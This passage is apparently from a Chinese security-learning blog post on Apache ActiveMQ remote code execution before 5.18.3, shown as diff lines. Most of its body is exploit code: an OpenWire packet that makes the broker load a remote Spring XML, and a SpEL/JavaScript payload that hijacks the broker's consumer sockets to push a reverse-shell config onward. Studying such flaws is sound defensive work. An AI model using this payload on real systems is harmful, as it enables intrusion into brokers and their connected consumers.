+dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;aa&quot;</span>)</span>;
+
+dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>)</span>;
+dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;http://localhost:8000/abcd&quot;</span>)</span>;
+
+bos.flush<span class="hljs-literal">()</span>;
+
+Socket socket =<span class="hljs-keyword">new</span> <span class="hljs-constructor">Socket(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, 61616)</span>;
+OutputStream socketOutputStream = socket.get<span class="hljs-constructor">OutputStream()</span>;
+socketOutputStream.write(bos.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>);
+socketOutputStream.close<span class="hljs-literal">()</span>;</code></pre></div>
+
+<h2 id="从broker到consumer"><a href="#从broker到consumer" class="headerlink" title="从broker到consumer"></a>从broker到consumer</h2><p>ActiveMQ有两种常用的消息模型，点对点、发布&#x2F;订阅模式。</p>
+<p>通常会设置一个监听器，同时让消费者和Broker保持长链接。</p>
+<p>那么思路就有了，在控制了Broker后，获取到Broker和消费已建立的Socket链接，给消费推恶意数据进行反序列化按理是可以实现利用的</p>
+<p>是真正意义上的由broker才能到consumer</p>
+<p><code>org.apache.activemq.broker.BrokerRegistry#getInstance</code></p>
+<div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BrokerRegistry</span> &#123;
+    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> Logger LOG = LoggerFactory.<span class="hljs-built_in">getLogger</span>(BrokerRegistry.<span class="hljs-keyword">class</span>);
+    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> BrokerRegistry INSTANCE = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BrokerRegistry</span>();
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object mutex = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>();
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;<span class="hljs-type">String</span>, BrokerService&gt; brokers = <span class="hljs-keyword">new</span> <span class="hljs-built_in">HashMap</span>();
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BrokerRegistry</span><span class="hljs-params">()</span> </span>&#123;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> BrokerRegistry <span class="hljs-title">getInstance</span><span class="hljs-params">()</span> </span>&#123;
+        <span class="hljs-keyword">return</span> INSTANCE;
+    &#125;</code></pre></div>
+
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240211014512696.png" srcset="/img/loading.gif" lazyload alt="image-20240211014512696"></p>
+<p>[Active Transport]即是已经建立的消费链接</p>
+<p>这里通过先让Broker加载远程配置文件在Broker上实现SPEL代码执行后，通过代码执行获取消费者socket推送恶意数据，加载远程配置文件。上面也说到了消费者默认开启了tightEncodingEnabled，所以需要使用tightEncodingEnabled的Exp</p>
+<div class="code-wrapper"><pre><code class="hljs scilab">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;
+&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span>
+       xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
+       xmlns:context=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span>
+       xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd</span>
+<span class="hljs-string">            http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd&quot;</span>&gt;
+
+    &lt;context:property-placeholder ignore-resource-not-found=<span class="hljs-string">&quot;false&quot;</span> ignore-unresolvable=<span class="hljs-string">&quot;false&quot;</span>/&gt;
+
+    &lt;bean class=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;
+        &lt;property name=<span class="hljs-string">&quot;String&quot;</span> value=<span class="hljs-string">&quot;#&#123;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&#x27;</span>js&#x27;).eval(&amp;quot;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getunsafe</span><span class="hljs-params">()</span> &#123;<span class="hljs-title">var</span> <span class="hljs-title">unsafe</span> = <span class="hljs-title">java</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">Class</span>.<span class="hljs-title">forName</span><span class="hljs-params">(&#x27;sun.misc.Unsafe&#x27;)</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;theUnsafe&#x27;)</span>;<span class="hljs-title">unsafe</span>.<span class="hljs-title">setAccessible</span><span class="hljs-params">(true)</span>;<span class="hljs-title">return</span> <span class="hljs-title">unsafe</span>.<span class="hljs-title">get</span><span class="hljs-params">(null)</span>;&#125; <span class="hljs-title">var</span> <span class="hljs-title">unsafe</span> = <span class="hljs-title">getunsafe</span><span class="hljs-params">()</span>; <span class="hljs-title">brokerRegistry</span> = <span class="hljs-title">org</span>.<span class="hljs-title">apache</span>.<span class="hljs-title">activemq</span>.<span class="hljs-title">broker</span>.<span class="hljs-title">BrokerRegistry</span>.<span class="hljs-title">getInstance</span><span class="hljs-params">()</span>;<span class="hljs-title">brokers</span> = <span class="hljs-title">brokerRegistry</span>.<span class="hljs-title">getBrokers</span><span class="hljs-params">()</span>;<span class="hljs-title">for</span><span class="hljs-params">(key in brokers)</span>&#123;   <span class="hljs-title">brokerService</span> = <span class="hljs-title">brokers</span>.<span class="hljs-title">get</span><span class="hljs-params">(key)</span>;  <span class="hljs-title">try</span>&#123; <span class="hljs-title">f</span> = <span class="hljs-title">brokerService</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;shutdownHook&#x27;)</span>; &#125;<span class="hljs-title">catch</span><span class="hljs-params">(e)</span>&#123;<span class="hljs-title">f</span> = <span class="hljs-title">brokerService</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getSuperclass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;shutdownHook&#x27;)</span>;&#125;   <span class="hljs-title">f</span>.<span class="hljs-title">setAccessible</span><span class="hljs-params">(true)</span>;   <span class="hljs-title">shutdownHook</span> = <span class="hljs-title">f</span>.<span class="hljs-title">get</span><span class="hljs-params">(brokerService)</span>;   <span class="hljs-title">threadGroup</span> = <span class="hljs-title">shutdownHook</span>.<span class="hljs-title">getThreadGroup</span><span class="hljs-params">()</span>;   <span class="hljs-title">f</span> = <span class="hljs-title">threadGroup</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;threads&#x27;)</span>; <span class="hljs-title">threads</span> = <span class="hljs-title">unsafe</span>.<span class="hljs-title">getObject</span><span class="hljs-params">(threadGroup, unsafe.objectFieldOffset(f)</span>); <span class="hljs-title">for</span><span class="hljs-params">(key in threads)</span>&#123;       <span class="hljs-title">thread</span> = <span class="hljs-title">threads</span>[<span class="hljs-title">key</span>];       <span class="hljs-title">if</span><span class="hljs-params">(thread == null)</span>&#123;           <span class="hljs-title">continue</span>;       &#125;       <span class="hljs-title">threadName</span> = <span class="hljs-title">thread</span>.<span class="hljs-title">getName</span><span class="hljs-params">()</span>;       <span class="hljs-title">if</span><span class="hljs-params">(threadName.startsWith(&#x27;ActiveMQ Transport: &#x27;)</span>)&#123;           <span class="hljs-title">f</span> = <span class="hljs-title">thread</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;target&#x27;)</span>;                      <span class="hljs-title">tcpTransport</span> = <span class="hljs-title">unsafe</span>.<span class="hljs-title">getObject</span><span class="hljs-params">(thread, unsafe.objectFieldOffset(f)</span>);           <span class="hljs-title">f</span> = <span class="hljs-title">tcpTransport</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;socket&#x27;)</span>;           <span class="hljs-title">f</span>.<span class="hljs-title">setAccessible</span><span class="hljs-params">(true)</span>;           <span class="hljs-title">socket</span> = <span class="hljs-title">f</span>.<span class="hljs-title">get</span><span class="hljs-params">(tcpTransport)</span>;           <span class="hljs-title">bos</span> = <span class="hljs-title">new</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">ByteArrayOutputStream</span><span class="hljs-params">()</span>;           <span class="hljs-title">dataOutput</span> = <span class="hljs-title">new</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">DataOutputStream</span><span class="hljs-params">(bos)</span>;           <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeInt</span><span class="hljs-params">(1)</span>;           <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeByte</span><span class="hljs-params">(31)</span>;    <span class="hljs-title">bs</span> = <span class="hljs-title">new</span> <span class="hljs-title">org</span>.<span class="hljs-title">apache</span>.<span class="hljs-title">activemq</span>.<span class="hljs-title">openwire</span>.<span class="hljs-title">BooleanStream</span><span class="hljs-params">()</span>;    <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(true)</span>;  <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(true)</span>;  <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(true)</span>;  <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(false)</span>;   <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(true)</span>; <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(false)</span>;  <span class="hljs-title">bs</span>.<span class="hljs-title">marshal</span><span class="hljs-params">(dataOutput)</span>; <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeUTF</span><span class="hljs-params">(&#x27;bb&#x27;)</span>;  <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeUTF</span><span class="hljs-params">(&#x27;aa&#x27;)</span>;  <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeUTF</span><span class="hljs-params">(&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;)</span>;  <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeUTF</span><span class="hljs-params">(&#x27;http://localhost:8000/dddd&#x27;)</span>;  <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeShort</span><span class="hljs-params">(0)</span>;  <span class="hljs-title">socketOutputStream</span> = <span class="hljs-title">socket</span>.<span class="hljs-title">getOutputStream</span><span class="hljs-params">()</span>;           <span class="hljs-title">socketOutputStream</span>.<span class="hljs-title">write</span><span class="hljs-params">(bos.toByteArray()</span>);         &#125;   &#125;   &#125;&amp;<span class="hljs-title">quot</span>;)&#125;&quot;/&gt;</span>
+    &lt;/bean&gt;
+&lt;/beans&gt;</code></pre></div>
+
+<p>上面意思是使用js代码执行以下代码</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> getunsafe<span class="hljs-literal">()</span> &#123;
+    var unsafe = java.lang.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(&#x27;<span class="hljs-params">sun</span>.<span class="hljs-params">misc</span>.Unsafe&#x27;)</span>.get<span class="hljs-constructor">DeclaredField(&#x27;<span class="hljs-params">theUnsafe</span>&#x27;)</span>;
+    unsafe.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+    return unsafe.get(null);
+&#125;
+var unsafe = getunsafe<span class="hljs-literal">()</span>;
+brokerRegistry = org.apache.activemq.broker.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BrokerRegistry</span>.</span></span>get<span class="hljs-constructor">Instance()</span>;
+brokers = brokerRegistry.get<span class="hljs-constructor">Brokers()</span>;
+<span class="hljs-keyword">for</span>(key <span class="hljs-keyword">in</span> brokers)&#123;
+    brokerService = brokers.get(key);
+    <span class="hljs-keyword">try</span>&#123; f = brokerService.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(&#x27;<span class="hljs-params">shutdownHook</span>&#x27;)</span>;
+    &#125;
+    catch(e) &#123;
+        f = brokerService.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Superclass()</span>.get<span class="hljs-constructor">DeclaredField(&#x27;<span class="hljs-params">shutdownHook</span>&#x27;)</span>;
+    &#125;
+    f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+    shutdownHook = f.get(brokerService);
+    threadGroup = shutdownHook.get<span class="hljs-constructor">ThreadGroup()</span>;
+    f = threadGroup.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(&#x27;<span class="hljs-params">threads</span>&#x27;)</span>;
+    threads = unsafe.get<span class="hljs-constructor">Object(<span class="hljs-params">threadGroup</span>, <span class="hljs-params">unsafe</span>.<span class="hljs-params">objectFieldOffset</span>(<span class="hljs-params">f</span>)</span>);
+    <span class="hljs-keyword">for</span>(key <span class="hljs-keyword">in</span> threads)&#123;
+        thread = threads<span class="hljs-literal">[<span class="hljs-identifier">key</span>]</span>;
+        <span class="hljs-keyword">if</span>(thread<span class="hljs-operator"> == </span>null)&#123;
+            continue;
+        &#125;
+        threadName = thread.get<span class="hljs-constructor">Name()</span>;
+        <span class="hljs-keyword">if</span>(threadName.starts<span class="hljs-constructor">With(&#x27;ActiveMQ Transport: &#x27;)</span>)&#123;
+            f = thread.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(&#x27;<span class="hljs-params">target</span>&#x27;)</span>;
+            tcpTransport = unsafe.get<span class="hljs-constructor">Object(<span class="hljs-params">thread</span>, <span class="hljs-params">unsafe</span>.<span class="hljs-params">objectFieldOffset</span>(<span class="hljs-params">f</span>)</span>);
+            f = tcpTransport.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(&#x27;<span class="hljs-params">socket</span>&#x27;)</span>;
+            f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+            socket = f.get(tcpTransport);
+            bos = <span class="hljs-keyword">new</span> java.io.<span class="hljs-constructor">ByteArrayOutputStream()</span>;
+            dataOutput = <span class="hljs-keyword">new</span> java.io.<span class="hljs-constructor">DataOutputStream(<span class="hljs-params">bos</span>)</span>;
+            dataOutput.write<span class="hljs-constructor">Int(1)</span>;
+            dataOutput.write<span class="hljs-constructor">Byte(31)</span>;
+            bs = <span class="hljs-keyword">new</span> org.apache.activemq.openwire.<span class="hljs-constructor">BooleanStream()</span>;
+            bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;
+            bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;
+            bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;
+            bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">false</span>)</span>;
+            bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;
+            bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">false</span>)</span>;
+            bs.marshal(dataOutput);
+            dataOutput.write<span class="hljs-constructor">UTF(&#x27;<span class="hljs-params">bb</span>&#x27;)</span>;
+            dataOutput.write<span class="hljs-constructor">UTF(&#x27;<span class="hljs-params">aa</span>&#x27;)</span>;
+            dataOutput.write<span class="hljs-constructor">UTF(&#x27;<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">context</span>.<span class="hljs-params">support</span>.ClassPathXmlApplicationContext&#x27;)</span>;
+            dataOutput.write<span class="hljs-constructor">UTF(&#x27;<span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">localhost</span>:8000<span class="hljs-operator">/</span><span class="hljs-params">dddd</span>&#x27;)</span>;
+            dataOutput.write<span class="hljs-constructor">Short(0)</span>;
+            socketOutputStream = socket.get<span class="hljs-constructor">OutputStream()</span>;
+            socketOutputStream.write(bos.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>);
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+
+
+<p>打broker加载的是上面执行js的xml文件，js代码中的是反弹shell的xml文件</p>
+<p>点对点消费测试（ 即点对点模式的长连接代码</p>
+<div class="code-wrapper"><pre><code class="hljs pgsql">ConnectionFactory connectionFactory = <span class="hljs-built_in">new</span> ActiveMQConnectionFactory(ActiveMQConnection.DEFAULT_USER,
+        ActiveMQConnection.DEFAULT_PASSWORD, &quot;tcp://localhost:61616&quot;);
+
+<span class="hljs-keyword">Connection</span> <span class="hljs-keyword">connection</span> = connectionFactory.createConnection();
+<span class="hljs-keyword">connection</span>.<span class="hljs-keyword">start</span>();
+<span class="hljs-keyword">Session</span> <span class="hljs-keyword">session</span> = <span class="hljs-keyword">connection</span>.createSession(<span class="hljs-keyword">false</span>, <span class="hljs-keyword">Session</span>.AUTO_ACKNOWLEDGE);
+Destination destination = <span class="hljs-keyword">session</span>.createQueue(&quot;tempQueue&quot;);
+MessageConsumer consumer = <span class="hljs-keyword">session</span>.createConsumer(destination);
+consumer.setMessageListener(<span class="hljs-built_in">new</span> MessageListener() &#123;
+    @Override
+    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> onMessage(Message message) &#123;
+
+        try &#123;
+            message.acknowledge();
+            TextMessage om = (TextMessage) message;
+            String data = om.getText();
+            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(data);
+        &#125; catch (JMSException e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;);
+<span class="hljs-keyword">System</span>.<span class="hljs-keyword">in</span>.<span class="hljs-keyword">read</span>();
+<span class="hljs-keyword">session</span>.<span class="hljs-keyword">close</span>();
+<span class="hljs-keyword">connection</span>.<span class="hljs-keyword">close</span>();</code></pre></div>
+
+<p>发布&#x2F;订阅消费测试 （即主题&#x2F;订阅模式长连接代码</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TopicConsumer</span> &#123;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consumer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> JMSException, IOException &#123;
+        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+        <span class="hljs-type">MessageConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+        <span class="hljs-keyword">try</span> &#123;
+            factory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveMQConnectionFactory</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;tcp://localhost:61616&quot;</span>);
+            connection = factory.createConnection();
+
+            connection.start();
+            session = connection.createSession(<span class="hljs-literal">false</span>, Session.AUTO_ACKNOWLEDGE);
+            <span class="hljs-type">Destination</span> <span class="hljs-variable">destination</span> <span class="hljs-operator">=</span> session.createTopic(TopicProducer.QUEUE_NAME);
+            consumer = session.createConsumer(destination);
+           
+            consumer.setMessageListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageListener</span>() &#123;
+                <span class="hljs-meta">@Override</span>
+                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onMessage</span><span class="hljs-params">(Message message)</span> &#123;
+
+                    <span class="hljs-keyword">try</span> &#123;
+                        <span class="hljs-type">TextMessage</span> <span class="hljs-variable">om</span> <span class="hljs-operator">=</span> (TextMessage) message;
+                        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> om.getText();
+                        System.out.println(data);
+                    &#125; <span class="hljs-keyword">catch</span> (JMSException e) &#123;
+                        e.printStackTrace();
+                    &#125;
+                &#125;
+            &#125;);
+        &#125; <span class="hljs-keyword">catch</span>(Exception ex)&#123;
+            <span class="hljs-keyword">throw</span> ex;
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;
+        <span class="hljs-type">TopicConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TopicConsumer</span>();
+        <span class="hljs-keyword">try</span>&#123;
+            consumer.consumer();
+        &#125; <span class="hljs-keyword">catch</span> (Exception ex)&#123;
+            ex.printStackTrace();
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+<p>存在其中一个长连接代码即可</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240211024029722.png" srcset="/img/loading.gif" lazyload alt="image-20240211024029722"></p>
+<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>服了，本来想调试一遍的，我好不容易弄好了服务端，结果运行client端那个demo的jdk版本好像不够报错，换了比jdk11还高的jdk17也没什么用，还是报错，服了</p>
+<p>算了算了</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/">https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yulegeyu.com/">雨了个雨’s blog (yulegeyu.com)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>学习ActiveMQ小于5.18.3的RCE</div>
+      <div>https://zer0peach.github.io/2024/02/09/学习ActiveMQ小于5-18-3的RCE/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/07/HGAME-WEEK2/" title="HGAME-WEEK2">
+                        <span class="hidden-mobile">HGAME-WEEK2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
